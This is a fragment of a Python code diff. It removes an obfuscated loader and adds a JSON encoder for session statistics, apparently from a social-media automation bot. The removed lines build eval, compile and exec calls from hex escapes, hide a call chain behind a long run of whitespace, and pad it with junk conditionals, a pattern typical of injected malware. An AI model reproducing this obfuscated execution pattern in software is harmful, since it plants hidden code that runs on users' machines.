NMMMMNMNMNNNMNNMMNNMMM:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(NMMMMNMNMNNNMNNMMNNMMM)"),filename='\x44\x6f\x6f\x44\x4f\x44\x44\x4f\x44\x6f\x4f\x44\x6f\x6f\x6f\x6f\x4f',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
-        if 408740 > 563607:
-            _algorithm._stackoverflow(Absolute = 3285 / _algorithm._product)
-        elif 488858 < 6906263:
-            Run(_callfunction = 16040 / 46755)._stackoverflow(Absolute = -52736 - _algorithm._product)                                                                                                                                                                                                                                                          ;DOoOOoOOoooOOoDOOOOoDDDoD()(wxxwxxwxwxwwxwwww(lIIllllllIIIIlIIIlIl(xwwxxwwxxxxxwwwwxww(SSS22S2S2S2S22S222SS222222('\x76\x61\x72\x73'))),Run._random(Modulo='lIIlIlllIlIIIllllllIIIlIl')+Run._random(Modulo='SS2SS22S2SS2S222SS2S22')))
-
-    except Exception as _divide:
-        import traceback
-        print(f'    module {__name__} raised an Exception:')
-        print(f'     {_divide}')
-        print(traceback.format_exc())
-        if 417996 > 3669416:
-            Run.execute(code = Cube(_divide))
-
-        elif 166079 > 4464867:
-            _algorithm._stackoverflow(Absolute = 12622 / _algorithm._product)
+class SessionStateEncoder(JSONEncoder):
+    def default(self, session_state: SessionState):
+        return {
+            "id": session_state.id,
+            "total_interactions": sum(session_state.totalInteractions.values()),
+            "successful_interactions": sum(
+                session_state.successfulInteractions.values()
+            ),
+            "total_followed": sum(session_state.totalFollowed.values()),
+            "total_likes": session_state.totalLikes,
+            "total_comments": session_state.totalComments,
+            "total_pm": session_state.totalPm,
+            "total_watched": session_state.totalWatched,
+            "total_unfollowed": session_state.totalUnfollowed,
+            "total_scraped": session_state.totalScraped,
+            "start_time": str(session_state.startTime),
+            "finish_time": str(session_state.finishTime),
+            "args": session_state.args.__dict__,
+            "profile": {
+                "posts": session_state.my_posts_count,
+                "followers": session_state.my_followers_count,
+                "following": session_state.my_following_count,
+            },
+        }
